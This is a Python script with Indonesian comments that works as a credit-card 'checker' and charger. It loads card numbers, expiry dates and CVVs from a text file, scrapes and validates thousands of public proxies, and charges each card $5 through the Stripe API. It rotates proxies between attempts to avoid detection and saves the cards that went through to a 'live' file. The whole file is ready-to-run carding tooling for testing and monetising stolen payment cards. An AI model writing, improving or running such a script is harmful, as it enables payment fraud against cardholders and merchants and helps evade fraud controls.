import requests
import os
import logging
import concurrent.futures
from dotenv import load_dotenv

# Load environment variables
load_dotenv()
logging.basicConfig(filename='vcc_checker.log', level=logging.INFO,
                    format='%(asctime)s:%(levelname)s:%(message)s')

STRIPE_API_KEY = os.getenv('STRIPE_API_KEY')
API_URL = "https://api.stripe.com/v1/tokens"
CHARGE_URL = "https://api.stripe.com/v1/charges"
CHARGE_AMOUNT = 500  # Jumlah dalam cents ($5.00)

# Fungsi untuk membaca URL proxy dari file source.txt
def read_proxy_sources(file_path="source.txt"):
    try:
        with open(file_path, 'r') as f:
            urls = [line.strip() for line in f if line.strip()]
        return urls
    except Exception as e:
        print(f"Error membaca file sumber proxy: {e}")
        return []

# Fungsi untuk mengambil proxy dari URL sumber
def fetch_proxies_from_url(url):
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            return response.text.splitlines()
    except requests.RequestException as e:
        logging.warning(f"Error mengambil proxy dari {url}: {e}")
    return []

# Fungsi untuk mengambil proxy dari semua sumber secara paralel
def fetch_proxies(proxy_sources):
    proxies = set()
    print("Sedang mengambil proxy dari sumber...")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        futures = [executor.submit(fetch_proxies_from_url, url) for url in proxy_sources]
        
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                proxies.update(result)
                print(f"Total proxy sementara: {len(proxies)}")

    return list(proxies)

# Fungsi untuk memeriksa apakah proxy aktif
def check_proxy(proxy, timeout=5):
    try:
        response = requests.get("https://google.com", proxies={"http": proxy, "https": proxy}, timeout=timeout)
        if response.status_code == 200:
            return True
    except requests.RequestException:
        return False
    return False

# Fungsi untuk memvalidasi proxy secara paralel
def validate_proxies(proxies, max_count=6000):
    valid_proxies = []
    print(f"{len(proxies)} proxy diambil, sedang memvalidasi...")

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        futures = {executor.submit(check_proxy, proxy): proxy for proxy in proxies}

        for future in concurrent.futures.as_completed(futures):
            proxy = futures[future]
            if future.result():
                valid_proxies.append(proxy)
                print(f"\rProxy valid ditemukan: {len(valid_proxies)}", end="")
            
            # Batas maksimum proxy valid
            if len(valid_proxies) >= max_count:
                break

    return valid_proxies

# Fungsi untuk membaca kartu kredit dari file card.txt tanpa duplikat
def read_credit_cards(file_path="card.txt"):
    try:
        with open(file_path, 'r') as f:
            card_lines = f.readlines()

        # Filter duplikat dan format yang benar
        unique_cards = set()
        credit_cards = []
        
        for line in card_lines:
            card_data = line.strip().split('|')
            if len(card_data) == 4:  # Memastikan formatnya CARD|MM|YY|CVV
                card_tuple = tuple(card_data)
                if card_tuple not in unique_cards:
                    unique_cards.add(card_tuple)
                    credit_cards.append(card_data)
                else:
                    logging.info(f"Duplikat kartu ditemukan dan dilewati: {card_data}")

        return credit_cards
    except Exception as e:
        print(f"Error membaca file kartu kredit: {e}")
        return []

# Fungsi untuk mengecek kartu dan melakukan charge
def check_and_charge_card(card_info, proxy=None):
    headers = {
        'Authorization': f'Bearer {STRIPE_API_KEY}',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    data = {
        'card[number]': card_info[0],
        'card[exp_month]': card_info[1],
        'card[exp_year]': card_info[2],
        'card[cvc]': card_info[3],
    }

    try:
        # Dapatkan token untuk kartu
        response = requests.post(API_URL, headers=headers, data=data, proxies={"http": proxy, "https": proxy}, timeout=5)
        if response.status_code != 200:
            logging.error(f"Gagal mendapatkan token untuk kartu {card_info}")
            return False

        token = response.json().get('id')
        if not token:
            logging.error(f"Tidak ada token yang dikembalikan untuk kartu {card_info}")
            return False

        # Charge kartu menggunakan token
        charge_data = {
            'amount': CHARGE_AMOUNT,
            'currency': 'usd',
            'source': token,
            'description': 'Success charged $5.00z',
        }
        charge_response = requests.post(CHARGE_URL, headers=headers, data=charge_data, proxies={"http": proxy, "https": proxy}, timeout=5)
        
        if charge_response.status_code == 200:
            logging.info(f"Charge berhasil: {card_info}")
            return True
        else:
            logging.error(f"Charge gagal untuk kartu {card_info}")
            return False
    except requests.RequestException as e:
        logging.error(f"Error dengan kartu {card_info}: {str(e)}")
        return False

# Fungsi utama
def main():
    os.system('clear')
    print("Mengambil proxy yang valid...")

    # Ambil URL sumber proxy dari file
    proxy_sources = read_proxy_sources()
    if not proxy_sources:
        print("Tidak ada sumber proxy yang ditemukan!")
        return
    
    # Ambil proxy dari sumber secara paralel dan validasi
    proxies = fetch_proxies(proxy_sources)
    valid_proxies = validate_proxies(proxies)

    if not valid_proxies:
        print("Tidak ada proxy valid yang ditemukan!")
        return

    credit_cards = read_credit_cards("card.txt")
    if not credit_cards:
        print("Tidak ada kartu kredit yang valid ditemukan!")
        return

    live_cards = []
    failed_cards = []

    # Proses charge untuk setiap kartu dengan rotasi proxy
    for card in credit_cards:
        proxy = valid_proxies.pop(0)  # Mengambil proxy pertama
        if check_and_charge_card(card, proxy):
            live_cards.append(card)
            print(f"\033[92mCharge sukses: {card}\033[0m")
        else:
            failed_cards.append(card)
            print(f"\033[91mCharge gagal: {card}\033[0m")

        # Rotasi proxy untuk permintaan berikutnya
        valid_proxies.append(proxy)

    # Simpan hasil
    with open('Live charger $5.txt', 'w') as f:
        for card in live_cards:
            f.write('|'.join(card) + '\n')
    with open('Failed charger $5.txt', 'w') as f:
        for card in failed_cards:
            f.write('|'.join(card) + '\n')
    print("Hasil berhasil disimpan di 'Live charger $5.txt' dan 'Failed charger $5.txt'")

if __name__ == "__main__":
    os.system('clear')
    main()
